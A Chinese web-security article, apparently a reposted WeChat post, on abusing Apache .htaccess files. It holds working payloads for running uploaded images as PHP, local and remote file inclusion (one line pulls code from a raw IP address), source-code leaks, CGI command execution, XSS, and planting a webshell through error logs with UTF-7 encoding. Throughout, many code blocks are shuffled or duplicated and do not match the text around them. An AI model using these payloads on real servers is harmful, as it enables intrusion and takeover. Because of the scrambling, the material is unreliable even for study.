> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BgLvBwwhz5FPfnN4qpK5QA)

![](https://mmbiz.qpic.cn/mmbiz_gif/GfOvuXUmaIichKN4fuyBV856xHdsnuRTeChfYItiaiaP6C5QQibXh56dmwWiaMFia2yE01nib45cPuiaib6kMd5OT95aeeA/640?wx_fmt=gif)  

**简介**
======

**.htaccess 文件提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一条或多条指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。.htaccess 中有 # 单行注释符, 且支持 \ 拼接上下两行。**  

**作用范围**
--------

.htaccess 文件中的配置指令作用于 .htaccess 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即**子**目录中的指令会覆盖父目录或者主配置文件中的指令。

**配置文件**
--------

启动 .htaccess，需要在服务器的主配置文件将 AllowOverride 设置为 All，如 apache2.conf

```
AllowOverride  All    # 启动.htaccess文件的使用
```

```
AccessFileName  .config    # 将.htaccess修改为.config
```

也可以通过 AccessFileName 将 .htaccess 修改为其他名：

```
SetHandler handler-name|None
```

**常见指令**
========

.htaccess 可以实现网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许 / 阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。如需了解详细功能可看这篇文章 http://www.htaccess-guide.com/ ， 这里就不一一介绍，主要讲解几种常利用的指令。

SetHandler 可以强制所有匹配的文件被一个指定的处理器处理

用法：

```
SetHandler application/x-httpd-php
```

示例 1：

```
SetHandler server-status
```

```
AddHandler handler-name extensive [extensive] ...
```

示例 2：

```
AddHandler cgi-script .xxx
```

apache 的服务器状态信息 (默认关闭)，可以查看所有访问本站的记录：

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dB7lxcMlMyRcs66ibh6xz9Sn1BdsCY7a9v6a810I0NfniacKOPR7yJ4UQ/640?wx_fmt=png)

访问任意不存在的文件，加参数 ?refresh=5 来实现每隔 5s 自动刷新。  

**AddHandler 可以在文件扩展名与特定的处理器之间建立映射**

用法：

```
AddType media-type extensive [extensive] ...
```

例如：

```
AddType application/x-httpd-php .gif
```

将扩展名为 .xxx 的文件作为 CGI 脚本来处理

**AddType 可以将给定的文件扩展名映射到指定的内容类型**

用法：

```
AddType application/x-httpd-php png jpg gif
```

```
php_value name value
```

示例 1：

```
auto_prepend_file：在主文件解析之前自动解析包含的文件
auto_append_file：在主文件解析后自动解析包含的文件
```

将以 gif 为后缀的文件当做 php 解析

示例 2：

```
php_value auto_prepend_file images.png
```

将以 .png .jpg .gif 多个后缀当做 php 解析  

php_value
---------

当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess 文件中的指令来修改 php 的配置设定。需要有 AllowOverride Options 或 AllowOverride All 权限才可以。

php_value 设定指定的值。要清除先前设定的值，把 value 设为 none。不要用 php_value 设定布尔值。应该用 php_flag。

用法：

```
php_value pcre.backtrack_limit 0
php_value pcre.jit 0
```

查看配置可被设定范围  

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7do9GycUYkI72DTzYB8tpcB7N8NHAUuLJ0fSN3Llv4CrV74wRZ6FFicbA/640?wx_fmt=png)

由上可知 .htaccess 只能用于 PHP_INI_ALL 或 PHP_INI_PERDIR 类型的指令。

查看 php.ini 配置选项列表，寻找可利用指令

**(1) 文件包含配置选项**

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dTSS0SuiceAic17tVrIYC6Dr55zqgjHvaaIY3e5picFicHCLFhnN2uBVKBg/640?wx_fmt=png)

```
php_flag name on|off
```

例如：

```
php_flag engine 0
```

访问一个 php 文件时，在该文件解析之前会先自动包含并解析 images.png 文件

**(2) 绕过 preg_match（正则回朔）**

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dlgcJQtdkgOQrT3bnvib8qF03JENDicFVKY3uKBZu7bnf6DaicFokQ923w/640?wx_fmt=png)

例如：

```
# 将images.png 当做 php 执行
<FileMatch "images.png">
    SetHandler application/x-httpd-php
</FileMatch>
```

设置正则回朔次数来使正则匹配的结果返回为 false 而不是 0 ，从而可以绕过正则。

**php_flag**
------------

php_flag 用来设定布尔值的 php 配置指令

用法：

```
# 将 .jpg 当做 php 文件解析
AddType application/x-httpd-php .png
```

查看 php.ini 配置选项列表，寻找可利用指令

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dBcMY7hmbEicSrTNMLRCLHaZ3w8B1juiccWr7hbZJxRzqTyrkj1YOpL4g/640?wx_fmt=png)

可以将 engine 设置为 0，在本目录和子目录中关闭 php 解析，造成源码泄露

```
php_value auto_prepend_file /etc/passwd
```

**利用方式**  

===========

文件解析, 经常出现在文件上传的黑名单没有限制 .htaceess 后缀，通过上传 .htaccess 文件，再上传图片，使图片的 php 恶意代码得以被解析执行。
----------------------------------------------------------------------------------

.htaccess 文件内容有如下两种

**1. SetHandler 指令**

```
php_value auto_append_file /etc/passwd
```

```
php_value auto_append_file http://39.101.219.210/phpinfo.txt
```

**2. AddType 指令**

```
php_flag engine 0
```

**文件包含**
--------

### **本地文件包含**

在本目录或子目录中需要有可解析的 php 文件时，可以通过 php_value 来设置 auto_prepend_file 或者 auto_append_file 配置选项包含一些敏感文件，来触发文件包含（可包含 WebShell）。

下面 .htaccess 分别通过这两个配置选项来包含 /etc/passwd，并访问同目录下的 index.php 文件。

**auto_prepend_file**

```
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
或
php_value auto_append_file data://text/plian,%3c%3fphp+phpinfo()%3b%3f%3e

// 注意url编码
```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7d9EpHLfTlibMP97iccwickJcQwgq3b9tS2bicmPBovrJyH1RrEDqAaqE0Zw/640?wx_fmt=png)

**auto_append_file**

```
php_value auto_append_file .htaccess
#<?php phpinfo();?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dtr8ZCoEm787NKGnTThZOLkYZEpMq6CwG9WSEicxCDdXiaMTz4XaRJZibg/640?wx_fmt=png)

### **远程文件包含**

PHP 的 allow_url_include 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为 allow_url_include 的配置范围为 PHP_INI_SYSTEM，所以无法利用 php_flag 在 .htaccess 中开启。

这里为了演示，就在 php.ini 中设置 allow_url_include 为 On：

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dqKe2kGeaDw5j6tHwOClia1w0raIW1FnJRAuQcP1ibn8RR4W6dRuXWQdA/640?wx_fmt=png)

.htaccess 中的设置为：

```
<Files ~ "^.ht">
    Require all granted
    Order allow,deny
    Allow from all
</Files>
```

```
SetHandler application/x-httpd-php
# <?php phpinfo();?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7d0Ae0u3Nqn96sSQPV9dvXicTEiacxyEClPrTVw2UuZHDrvjYgnSl8oB4g/640?wx_fmt=png)

这样，最终目标主机上的 php 文件都会包含这个远程主机上的 phpinfo.txt：

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dlyUOriczZKhicgTQpYsK7EUo6KiaAOpoMNNvT5pjPI6QEpcKHF7QXV9GA/640?wx_fmt=png)

源码泄露  

**利用 php_flag 将 engine 设置为 0，在本目录和子目录中关闭 php 解析，造成源码泄露。**

```
<Files ~ "^.ht">
    Require all granted
    Order allow,deny
    Allow from all
</Files>
SetHandler application/x-httpd-php
# <?php phpinfo();?>
```

```
LoadModule cgi_module modules/mod_dgi.so
```

这里在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码：

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dVia4L0AVACxdIAc3wic2pBk9AaibYSFGzOCwZZKgdE6EvFWiccNYasyvhA/640?wx_fmt=png)

代码执行
----

### 1. 利用 php 伪协议

**条件：allow_url_fopen、allow_url_include 为 On**

```
Option ExecCGI # 允许CGI执行
AddHandler cgi-script .xx  # 将后缀为xx的文件当做CGI程序进行解析
shell.xx：
#!C:/Windows/System32/cmd.exe /k 
start calc.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dmicgIKZGlMGMAMNFjBuYzA8YTCo16yHYx1BwK1YOqGweaL7YQHnGkKQ/640?wx_fmt=png)

### 2. 解析. htaccess

**方法一：**

```
例题可看
https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check in
```

即让 php 文件包含. htaccess 自己：

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dXqibD9oiceSibCNQNQGS2FRaXicj9JYfWX8e2AtZeY0v7DweG99f5K6s5Q/640?wx_fmt=png)

**方法二：**

**这种适合同目录或子目录没有 php 文件的情况下。**

需要里先设置允许可访问 .htaccess 文件：

```
LoadModule fcgid_module modules/mod_fcgid.so
```

```
Options +ExecCGI
AddHandler fcgid-script .xx
FcgidWrapper "C:/Windows/System32/cmd.exe /k start calc.exe"
```

然后再设置将 .htaccess 指定当做 php 文件处理

```
php_value highlight.comment '"><script>alert(1);</script>'
```

```
<?php
highlight_file(__FILE__);
// comment
```

最终. htaccess 文件里面的内容为：

```
<?php
include('foo'); # foo报错
```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7ddZR3artTZnavW5TyL5osrgauVFdVV2vUv3zmRLjiaLgicb7GgebrZoHw/640?wx_fmt=png)

**命令执行**
--------

### CGI 启动

cgi_module 需要被加载，**即 apache 配置文件中有：**

```
php_flag display_errors 1
php_flag html_errors 1
php_value docref_root "'><script>alert(1);</script>"
```

```
<?php include('shell'); #报错页面
```

```
php_value error_log /var/www/html/shell.php
php_value include_path "<?php phpinfo(); __halt_compiler();"
```

访问 shell.xx 后将弹出计算器：

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dFeFeevYfZboDTL2rlKr8iaGt1fyuzt8KrLRsWVXYWHhmaU9icjjEugsg/640?wx_fmt=png)

```
# 第一次
php_value error_log /tmp/shell #定义错误路径
#---- "<?php phpinfo(); __halt_compiler();" in UTF-7:
php_value include_path "+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs"
# 第二次
php_value include_path "/tmp" #将include()的默认路径改变
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```

### FastCGI 启动

mod_fcgid.so 需要被加载。**即 apache 配置文件中有：**

```
#define width 1337
#define height 1337
```

然后. htaccess 中的内容：

```
#define width 1337
#define height 1337
AddType application/x-httpd-php .gif
```

shell.xx 的内容随意。

访问 shell.xx 即可弹出计算器：

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7duAIEhuU1BibV9Kwk3f5pZbCt6jehAiaibb1PyRTg7TChzZlIaAyDn1M4Q/640?wx_fmt=png)

**XSS**
-------

### 利用 highlight_file

```
php_value highlight.comment '"><script>alert(1);</script>'
```

test.php 中的内容为：

```
<?php
highlight_file(__FILE__);
// comment
```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7d0K7iaX3EpjkdBZJ35kqvG8g2bjBguZVMGlCwniacWfiaDa6oVr85h8PCw/640?wx_fmt=png)

### 利用错误消息链接，test.php 中的内容为：

```
<?php
include('foo'); # foo报错
```

.htaccess 中的内容：

```
php_flag display_errors 1
php_flag html_errors 1
php_value docref_root "'><script>alert(1);</script>"
```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dY6eFGevuqXkGrvBBS461pULpBOJnFolQ1Ztp3mN2tEgHLl5Quaic0Fg/640?wx_fmt=png)

自定义错误文件
-------

error.php：

```
<?php include('shell'); #报错页面
```

.htaccess：

```
php_value error_log /var/www/html/shell.php
php_value include_path "<?php phpinfo(); __halt_compiler();"
```

访问 error.php，会报错并记录在 shell.php 文件中

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7d1cJs2NgO1Jby9UsIxrY7dQLsTZbPpqEY20wjHBdh88WAdMgn8zJ4ykrwY4EWyWSxZn7mAj9cCJg/640?wx_fmt=png)

可以通过这种方法来往目标主机上写马。因为会经过 html 编码，所以需要 UTF-7 来绕过。

.htaccess：

```
# 第一次
php_value error_log /tmp/shell #定义错误路径
#---- "<?php phpinfo(); __halt_compiler();" in UTF-7:
php_value include_path "+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs"
# 第二次
php_value include_path "/tmp" #将include()的默认路径改变
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```

在文件上传时，有时候会用 exif_imagetype 函数判断一个图像的类型，读取一个图像的第一个字节并检查其签名，所以我们图片马的开头要加上 GIF89a，但是如果我们在. htaccess 文件中也加入 GIF89a 的话会导致. htaccess 文件无法生效，所以我们要用别的方法。

*   方法一：即预定义高度宽度：
    

```
#define width 1337
#define height 1337
```

```
文件内容---
```

这种方法可以让. htaccess 文件生效，因为’#’号在. htaccess 文件中是注释符，不影响文件本身内容解析。

*   方法二：利用`\x00\x00\x8a\x39\x8a\x39`
    

`x00x00x8ax30x8ax39`是 wbmp 文件的文件头，0x00 在. htaccess 文件中同样也是注释符，所以不会影响文件本身。注意：在. htaccess 前添加 x00x00x8ax39x8ax39 要在十六进制编辑器中添加，或者使用 python 的 bytes 类型。

所以我们. htaccess 文件的内容可以为：

```
#define width 1337
#define height 1337
AddType application/x-httpd-php .gif
```

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**